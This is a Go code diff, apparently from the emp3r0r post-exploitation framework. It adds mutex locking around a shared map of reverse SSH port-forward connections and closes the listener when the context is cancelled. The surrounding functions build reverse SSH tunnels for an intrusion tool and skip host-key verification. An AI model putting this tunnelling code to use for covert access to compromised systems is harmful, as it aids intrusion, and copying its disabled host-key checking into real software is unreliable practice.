@@ -5,6 +5,7 @@ import (
 	"fmt"
 	"io"
 	"net"
+	"sync"
 	"time"
 
 	gliderssh "github.com/gliderlabs/ssh"
@@ -63,6 +64,7 @@ func SSHReverseProxyClient(ssh_serverAddr string, // SSH server address:port
 	password string, // SSH authentication password
 	proxyPort int, // local port to forward to remote, in here it should be Emp3r0rProxyPort
 	reverseConns *map[string]context.CancelFunc,
+	reverseConnsMutex *sync.Mutex,
 	socks5proxy *socks5.Server,
 	ctx context.Context, cancel context.CancelFunc,
 ) (err error) {
@@ -78,7 +80,7 @@ func SSHReverseProxyClient(ssh_serverAddr string, // SSH server address:port
 	}()
 
 	return SSHRemoteFwdClient(ssh_serverAddr, password, nil,
-		proxyPort, reverseConns, ctx, cancel)
+		proxyPort, reverseConns, reverseConnsMutex, ctx, cancel)
 }
 
 // SSHRemoteFwdClient dial SSHRemoteFwdServer, forward local TCP port to remote server
@@ -88,6 +90,7 @@ func SSHRemoteFwdClient(ssh_serverAddr, password string,
 	hostkey ssh.PublicKey, // ssh server public key
 	local_port int, // local port to forward to remote
 	conns *map[string]context.CancelFunc, // record this connection
+	connsMutex *sync.Mutex,
 	ctx context.Context, cancel context.CancelFunc,
 ) (err error) {
 	hostkey_callback := ssh.InsecureIgnoreHostKey()
@@ -121,10 +124,29 @@ func SSHRemoteFwdClient(ssh_serverAddr, password string,
 	defer l.Close()
 	defer cancel()
 
+	go func() {
+		<-ctx.Done()
+		l.Close()
+	}()
+
 	connsList := *conns
+	if connsMutex != nil {
+		connsMutex.Lock()
+	}
 	connsList[ssh_serverAddr] = cancel // record this connection
+	if connsMutex != nil {
+		connsMutex.Unlock()
+	}
 	toAddr := fmt.Sprintf("127.0.0.1:%d", local_port)
-	defer delete(connsList, ssh_serverAddr)
+	defer func() {
+		if connsMutex != nil {
+			connsMutex.Lock()
+		}
+		delete(connsList, ssh_serverAddr)
+		if connsMutex != nil {
+			connsMutex.Unlock()
+		}
+	}()
 
 	// forward to target local port
 	serveConn := func(conn net.Conn) {
